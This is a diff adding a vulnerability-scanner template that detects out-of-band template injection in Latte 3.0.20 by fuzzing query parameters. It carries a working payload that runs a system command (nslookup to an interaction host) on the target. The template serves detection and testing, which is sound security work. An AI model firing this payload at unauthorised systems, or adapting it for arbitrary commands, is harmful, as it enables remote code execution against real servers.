@@ -1,0 +1,40 @@
+id: latte-oob
+
+info:
+  name: Latte 3.0.20 - Out of Band Template Injection
+  author: 0xAwali,DhiyaneshDK
+  severity: high
+  reference:
+    - https://github.com/nette/latte
+    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
+  metadata:
+    verified: true
+  tags: ssti,dast,oast,oob
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - '%7Bphp%20system%28%27nslookup%20-type%3DSRV%20{{interactsh-url}}%27%29%7D'
+
+    skip-variables-check: true
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers:
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'dns')"
+          - "contains(interactsh_request,'srv')"
+        condition: and
+# digest: 490a0046304402200d483fbb88716d2d47685a03aa0dee25caf8ece71174565e25549d720827b99d022032645bd75dac7fbb60dcceceb92917482b922dcbc9832bae31c640f3dc828eb7:922c64590222798bb761d5b6d8e72950
